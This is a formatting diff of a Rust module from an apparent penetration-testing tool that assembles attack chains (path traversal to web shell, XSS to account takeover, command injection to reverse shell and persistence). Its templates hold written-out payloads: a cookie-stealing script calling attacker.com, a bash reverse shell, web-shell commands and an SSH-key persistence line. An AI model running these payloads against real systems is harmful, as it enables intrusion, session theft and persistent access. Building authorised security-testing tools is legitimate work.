@@ -1,7 +1,7 @@
 //! Multi-step attack chain builder combining findings into exploitation paths.
 
-use serde::{Deserialize, Serialize};
 use grym_core::{Finding, Severity};
+use serde::{Deserialize, Serialize};
 use url::Url;
 
 /// A single step in an attack chain.
@@ -62,9 +62,39 @@ pub fn build_attack_chains(findings: &[Finding], target: &str) -> Vec<AttackChai
             description: "Traverse to writable directories, upload web shell, achieve RCE.".into(),
             target: target.into(),
             steps: vec![
-                AttackStep { order: 1, name: "Find writable webroot path".into(), technique: "Path Traversal".into(), description: "Use LFI to map filesystem and find upload directories.".into(), prerequisite: Some("Path traversal vulnerability".into()), findings_used: vec!["path_traversal".into()], generated_payloads: vec!["../../../var/www/html/upload/".into()], success_indicator: "Directory listing or known path accessible".into(), severity: "High".into() },
-                AttackStep { order: 2, name: "Upload malicious file".into(), technique: "File Upload Abuse".into(), description: "Bypass extension filters to upload PHP/ASP/JSP shell.".into(), prerequisite: Some("File upload feature".into()), findings_used: vec!["file_upload".into()], generated_payloads: vec!["shell.php.jpg with .htaccess".into()], success_indicator: "Shell accessible at predictable URL".into(), severity: "High".into() },
-                AttackStep { order: 3, name: "Execute commands".into(), technique: "RCE".into(), description: "Interact with web shell to run system commands.".into(), prerequisite: Some("Web shell uploaded".into()), findings_used: vec!["rce".into()], generated_payloads: vec!["shell.php?cmd=id".into()], success_indicator: "Command output returned".into(), severity: "Critical".into() },
+                AttackStep {
+                    order: 1,
+                    name: "Find writable webroot path".into(),
+                    technique: "Path Traversal".into(),
+                    description: "Use LFI to map filesystem and find upload directories.".into(),
+                    prerequisite: Some("Path traversal vulnerability".into()),
+                    findings_used: vec!["path_traversal".into()],
+                    generated_payloads: vec!["../../../var/www/html/upload/".into()],
+                    success_indicator: "Directory listing or known path accessible".into(),
+                    severity: "High".into(),
+                },
+                AttackStep {
+                    order: 2,
+                    name: "Upload malicious file".into(),
+                    technique: "File Upload Abuse".into(),
+                    description: "Bypass extension filters to upload PHP/ASP/JSP shell.".into(),
+                    prerequisite: Some("File upload feature".into()),
+                    findings_used: vec!["file_upload".into()],
+                    generated_payloads: vec!["shell.php.jpg with .htaccess".into()],
+                    success_indicator: "Shell accessible at predictable URL".into(),
+                    severity: "High".into(),
+                },
+                AttackStep {
+                    order: 3,
+                    name: "Execute commands".into(),
+                    technique: "RCE".into(),
+                    description: "Interact with web shell to run system commands.".into(),
+                    prerequisite: Some("Web shell uploaded".into()),
+                    findings_used: vec!["rce".into()],
+                    generated_payloads: vec!["shell.php?cmd=id".into()],
+                    success_indicator: "Command output returned".into(),
+                    severity: "Critical".into(),
+                },
             ],
             estimated_impact: "Full server compromise".into(),
             difficulty: "Medium".into(),
@@ -97,12 +127,46 @@ pub fn build_attack_chains(findings: &[Finding], target: &str) -> Vec<AttackChai
     if has_finding(findings, "xss") {
         chains.push(AttackChain {
             name: "XSS to Account Takeover".into(),
-            description: "Steal session cookies via XSS, impersonate victim, escalate privileges.".into(),
+            description: "Steal session cookies via XSS, impersonate victim, escalate privileges."
+                .into(),
             target: target.into(),
             steps: vec![
-                AttackStep { order: 1, name: "Harvest session cookies".into(), technique: "XSS".into(), description: "Inject payload that exfiltrates cookies to attacker server.".into(), prerequisite: Some("Reflected or stored XSS".into()), findings_used: vec!["xss".into()], generated_payloads: vec!["<script>fetch('https://attacker.com/?c='+document.cookie)</script>".into()], success_indicator: "Cookie received by attacker".into(), severity: "High".into() },
-                AttackStep { order: 2, name: "Impersonate victim".into(), technique: "Session Hijacking".into(), description: "Replay stolen session token in browser or via curl.".into(), prerequisite: Some("Session cookie without HttpOnly".into()), findings_used: vec!["xss".into()], generated_payloads: vec!["curl -b 'session=STOLEN' target/profile".into()], success_indicator: "Authenticated as victim".into(), severity: "High".into() },
-                AttackStep { order: 3, name: "Escalate privileges".into(), technique: "Privilege Escalation".into(), description: "Use admin functionality if victim is privileged.".into(), prerequisite: Some("Victim has admin role".into()), findings_used: vec!["idor".into()], generated_payloads: vec!["POST /admin/users/role admin=true".into()], success_indicator: "Role changed successfully".into(), severity: "Critical".into() },
+                AttackStep {
+                    order: 1,
+                    name: "Harvest session cookies".into(),
+                    technique: "XSS".into(),
+                    description: "Inject payload that exfiltrates cookies to attacker server."
+                        .into(),
+                    prerequisite: Some("Reflected or stored XSS".into()),
+                    findings_used: vec!["xss".into()],
+                    generated_payloads: vec![
+                        "<script>fetch('https://attacker.com/?c='+document.cookie)</script>".into(),
+                    ],
+                    success_indicator: "Cookie received by attacker".into(),
+                    severity: "High".into(),
+                },
+                AttackStep {
+                    order: 2,
+                    name: "Impersonate victim".into(),
+                    technique: "Session Hijacking".into(),
+                    description: "Replay stolen session token in browser or via curl.".into(),
+                    prerequisite: Some("Session cookie without HttpOnly".into()),
+                    findings_used: vec!["xss".into()],
+                    generated_payloads: vec!["curl -b 'session=STOLEN' target/profile".into()],
+                    success_indicator: "Authenticated as victim".into(),
+                    severity: "High".into(),
+                },
+                AttackStep {
+                    order: 3,
+                    name: "Escalate privileges".into(),
+                    technique: "Privilege Escalation".into(),
+                    description: "Use admin functionality if victim is privileged.".into(),
+                    prerequisite: Some("Victim has admin role".into()),
+                    findings_used: vec!["idor".into()],
+                    generated_payloads: vec!["POST /admin/users/role admin=true".into()],
+                    success_indicator: "Role changed successfully".into(),
+                    severity: "Critical".into(),
+                },
             ],
             estimated_impact: "Account takeover, privilege escalation".into(),
             difficulty: "Easy".into(),
@@ -175,9 +239,39 @@ pub fn build_attack_chains(findings: &[Finding], target: &str) -> Vec<AttackChai
             description: "Execute arbitrary commands, establish persistence, and pivot.".into(),
             target: target.into(),
             steps: vec![
-                AttackStep { order: 1, name: "Confirm command injection".into(), technique: "Command Injection".into(), description: "Inject platform-agnostic command and observe output.".into(), prerequisite: Some("User input passed to shell".into()), findings_used: vec!["command_injection".into()], generated_payloads: vec!["; id #".into(), "& whoami".into()], success_indicator: "Command output in response".into(), severity: "High".into() },
-                AttackStep { order: 2, name: "Establish reverse shell".into(), technique: "RCE".into(), description: "Download and execute reverse shell payload.".into(), prerequisite: Some("Outbound connectivity".into()), findings_used: vec!["command_injection".into()], generated_payloads: vec!["bash -i >& /dev/tcp/attacker/4444 0>&1".into()], success_indicator: "Shell received on attacker host".into(), severity: "Critical".into() },
-                AttackStep { order: 3, name: "Persist access".into(), technique: "Persistence".into(), description: "Add SSH key, cron job, or web shell.".into(), prerequisite: Some("Write access to filesystem".into()), findings_used: vec!["rce".into()], generated_payloads: vec!["echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys".into()], success_indicator: "SSH login succeeds".into(), severity: "Critical".into() },
+                AttackStep {
+                    order: 1,
+                    name: "Confirm command injection".into(),
+                    technique: "Command Injection".into(),
+                    description: "Inject platform-agnostic command and observe output.".into(),
+                    prerequisite: Some("User input passed to shell".into()),
+                    findings_used: vec!["command_injection".into()],
+                    generated_payloads: vec!["; id #".into(), "& whoami".into()],
+                    success_indicator: "Command output in response".into(),
+                    severity: "High".into(),
+                },
+                AttackStep {
+                    order: 2,
+                    name: "Establish reverse shell".into(),
+                    technique: "RCE".into(),
+                    description: "Download and execute reverse shell payload.".into(),
+                    prerequisite: Some("Outbound connectivity".into()),
+                    findings_used: vec!["command_injection".into()],
+                    generated_payloads: vec!["bash -i >& /dev/tcp/attacker/4444 0>&1".into()],
+                    success_indicator: "Shell received on attacker host".into(),
+                    severity: "Critical".into(),
+                },
+                AttackStep {
+                    order: 3,
+                    name: "Persist access".into(),
+                    technique: "Persistence".into(),
+                    description: "Add SSH key, cron job, or web shell.".into(),
+                    prerequisite: Some("Write access to filesystem".into()),
+                    findings_used: vec!["rce".into()],
+                    generated_payloads: vec!["echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys".into()],
+                    success_indicator: "SSH login succeeds".into(),
+                    severity: "Critical".into(),
+                },
             ],
             estimated_impact: "Full server compromise and persistence".into(),
             difficulty: "Easy".into(),
@@ -207,45 +301,65 @@ pub fn build_attack_chains(findings: &[Finding], target: &str) -> Vec<AttackChai
         });
     }
 
-    chains.sort_by(|a, b| b.cvss_aggregate.partial_cmp(&a.cvss_aggregate).unwrap_or(std::cmp::Ordering::Equal));
+    chains.sort_by(|a, b| {
+        b.cvss_aggregate
+            .partial_cmp(&a.cvss_aggregate)
+            .unwrap_or(std::cmp::Ordering::Equal)
+    });
     chains
 }
 
 /// Convenience async wrapper that builds chains from current findings.
-pub async fn build_chains_from_findings(_client: &grym_core::ScopedClient, url: &Url) -> Result<Vec<grym_core::Finding>, grym_core::ScopedClientError> {
+pub async fn build_chains_from_findings(
+    _client: &grym_core::ScopedClient,
+    url: &Url,
+) -> Result<Vec<grym_core::Finding>, grym_core::ScopedClientError> {
     // In a real scenario we'd fetch current findings from storage; here we return templates as findings.
     let chains = build_attack_chains(&[], url.as_str());
-    Ok(chains.into_iter().map(|chain| {
-        let mut f = Finding::new(
-            format!("Attack chain: {}", chain.name),
-            grym_core::AssetRef { identifier: chain.target.clone(), kind: "web".into() },
-            match chain.cvss_aggregate {
-                s if s >= 9.0 => Severity::Critical,
-                s if s >= 7.0 => Severity::High,
-                s if s >= 4.0 => Severity::Medium,
-                _ => Severity::Low,
-            },
-            grym_core::Confidence::Likely,
-            "grym-chain-builder",
-        );
-        f.remediation = chain.description;
-        f.attack_techniques = chain.mitre_techniques;
-        f.cvss_score = Some(chain.cvss_aggregate);
-        f.evidence.push(grym_core::Evidence::redacted(
-            "attack-chain",
-            chain.name,
-            &format!("Steps: {} | Difficulty: {} | Time: {}", chain.steps.len(), chain.difficulty, chain.time_estimate),
-        ));
-        f
-    }).collect())
+    Ok(chains
+        .into_iter()
+        .map(|chain| {
+            let mut f = Finding::new(
+                format!("Attack chain: {}", chain.name),
+                grym_core::AssetRef {
+                    identifier: chain.target.clone(),
+                    kind: "web".into(),
+                },
+                match chain.cvss_aggregate {
+                    s if s >= 9.0 => Severity::Critical,
+                    s if s >= 7.0 => Severity::High,
+                    s if s >= 4.0 => Severity::Medium,
+                    _ => Severity::Low,
+                },
+                grym_core::Confidence::Likely,
+                "grym-chain-builder",
+            );
+            f.remediation = chain.description;
+            f.attack_techniques = chain.mitre_techniques;
+            f.cvss_score = Some(chain.cvss_aggregate);
+            f.evidence.push(grym_core::Evidence::redacted(
+                "attack-chain",
+                chain.name,
+                &format!(
+                    "Steps: {} | Difficulty: {} | Time: {}",
+                    chain.steps.len(),
+                    chain.difficulty,
+                    chain.time_estimate
+                ),
+            ));
+            f
+        })
+        .collect())
 }
 
 fn has_finding(findings: &[Finding], category: &str) -> bool {
     let needle = category.to_lowercase();
     findings.iter().any(|f| {
-        f.title.to_lowercase().contains(&needle) ||
-        f.categories.iter().any(|c| c.to_lowercase().contains(&needle)) ||
-        f.remediation.to_lowercase().contains(&needle)
+        f.title.to_lowercase().contains(&needle)
+            || f.categories
+                .iter()
+                .any(|c| c.to_lowercase().contains(&needle))
+            || f.remediation.to_lowercase().contains(&needle)
     })
 }
 
@@ -265,90 +379,21 @@ pub fn score_chain(chain: &AttackChain) -> f64 {
 
 /// Generate human-readable exploitation instructions.
 pub fn generate_exploit_steps(chain: &AttackChain) -> Vec<String> {
-    chain.steps.iter().map(|s| {
-        format!(
-            "{}. {} [{}]\n   Prerequisite: {}\n   Payloads: {}\n   Success indicator: {}",
-            s.order,
-            s.name,
-            s.technique,
-            s.prerequisite.as_deref().unwrap_or("None"),
-            s.generated_payloads.join(", "),
-            s.success_indicator
-        )
-    }).collect()
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use grym_core::{AssetRef, Confidence, Severity};
-
-    fn make_finding(title: &str, category: &str) -> Finding {
-        let mut f = Finding::new(
-            title,
-            AssetRef { identifier: "test".into(), kind: "web".into() },
-            Severity::High,
-            Confidence::Likely,
-            "test",
-        );
-        f.categories.push(category.into());
-        f
-    }
-
-    #[test]
-    fn test_build_chains_from_sqli_finding() {
-        let findings = vec![make_finding("SQL injection", "sqli")];
-        let chains = build_attack_chains(&findings, "http://target");
-        assert!(!chains.is_empty());
-        assert!(chains.iter().any(|c| c.name.contains("SQL Injection")));
-    }
-
-    #[test]
-    fn test_build_chains_from_xss_finding() {
-        let findings = vec![make_finding("Reflected XSS", "xss")];
-        let chains = build_attack_chains(&findings, "http://target");
-        assert!(chains.iter().any(|c| c.name.contains("XSS")));
-    }
-
-    #[test]
-    fn test_chain_score_sorted_descending() {
-        let findings = vec![make_finding("SQL injection", "sqli"), make_finding("SSRF", "ssrf")];
-        let chains = build_attack_chains(&findings, "http://target");
-        for window in chains.windows(2) {
-            assert!(window[0].cvss_aggregate >= window[1].cvss_aggregate);
-        }
-    }
-
-    #[test]
-    fn test_score_chain_calculation() {
-        let chain = AttackChain {
-            name: "Test".into(),
-            description: "Test".into(),
-            target: "test".into(),
-            steps: vec![
-                AttackStep { order: 1, name: "A".into(), technique: "T".into(), description: "D".into(), prerequisite: None, findings_used: vec![], generated_payloads: vec![], success_indicator: "S".into(), severity: "High".into() },
-            ],
-            estimated_impact: "Test".into(),
-            difficulty: "Easy".into(),
-            time_estimate: "1h".into(),
-            prerequisites: vec![],
-            mitre_techniques: vec![],
-            cvss_aggregate: 8.0,
-        };
-        let score = score_chain(&chain);
-        assert!(score > 8.0);
-    }
-
-    #[test]
-    fn test_generate_exploit_steps() {
-        let template = chain_templates().into_iter().next();
-        assert!(template.is_some(), "chain_templates should not be empty");
-        if let Some(chain) = template {
-            let steps = generate_exploit_steps(&chain);
-            assert!(!steps.is_empty());
-            assert!(steps[0].contains("Inject JNDI payload"));
-        }
-    }
+    chain
+        .steps
+        .iter()
+        .map(|s| {
+            format!(
+                "{}. {} [{}]\n   Prerequisite: {}\n   Payloads: {}\n   Success indicator: {}",
+                s.order,
+                s.name,
+                s.technique,
+                s.prerequisite.as_deref().unwrap_or("None"),
+                s.generated_payloads.join(", "),
+                s.success_indicator
+            )
+        })
+        .collect()
 }
 
 /// Predefined chain templates for common scenarios.
@@ -387,4 +432,91 @@ pub fn chain_templates() -> Vec<AttackChain> {
             cvss_aggregate: 9.8,
         },
     ]
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use grym_core::{AssetRef, Confidence, Severity};
+
+    fn make_finding(title: &str, category: &str) -> Finding {
+        let mut f = Finding::new(
+            title,
+            AssetRef {
+                identifier: "test".into(),
+                kind: "web".into(),
+            },
+            Severity::High,
+            Confidence::Likely,
+            "test",
+        );
+        f.categories.push(category.into());
+        f
+    }
+
+    #[test]
+    fn test_build_chains_from_sqli_finding() {
+        let findings = vec![make_finding("SQL injection", "sqli")];
+        let chains = build_attack_chains(&findings, "http://target");
+        assert!(!chains.is_empty());
+        assert!(chains.iter().any(|c| c.name.contains("SQL Injection")));
+    }
+
+    #[test]
+    fn test_build_chains_from_xss_finding() {
+        let findings = vec![make_finding("Reflected XSS", "xss")];
+        let chains = build_attack_chains(&findings, "http://target");
+        assert!(chains.iter().any(|c| c.name.contains("XSS")));
+    }
+
+    #[test]
+    fn test_chain_score_sorted_descending() {
+        let findings = vec![
+            make_finding("SQL injection", "sqli"),
+            make_finding("SSRF", "ssrf"),
+        ];
+        let chains = build_attack_chains(&findings, "http://target");
+        for window in chains.windows(2) {
+            assert!(window[0].cvss_aggregate >= window[1].cvss_aggregate);
+        }
+    }
+
+    #[test]
+    fn test_score_chain_calculation() {
+        let chain = AttackChain {
+            name: "Test".into(),
+            description: "Test".into(),
+            target: "test".into(),
+            steps: vec![AttackStep {
+                order: 1,
+                name: "A".into(),
+                technique: "T".into(),
+                description: "D".into(),
+                prerequisite: None,
+                findings_used: vec![],
+                generated_payloads: vec![],
+                success_indicator: "S".into(),
+                severity: "High".into(),
+            }],
+            estimated_impact: "Test".into(),
+            difficulty: "Easy".into(),
+            time_estimate: "1h".into(),
+            prerequisites: vec![],
+            mitre_techniques: vec![],
+            cvss_aggregate: 8.0,
+        };
+        let score = score_chain(&chain);
+        assert!(score > 8.0);
+    }
+
+    #[test]
+    fn test_generate_exploit_steps() {
+        let template = chain_templates().into_iter().next();
+        assert!(template.is_some(), "chain_templates should not be empty");
+        if let Some(chain) = template {
+            let steps = generate_exploit_steps(&chain);
+            assert!(!steps.is_empty());
+            assert!(steps[0].contains("Inject JNDI payload"));
+        }
+    }
 }
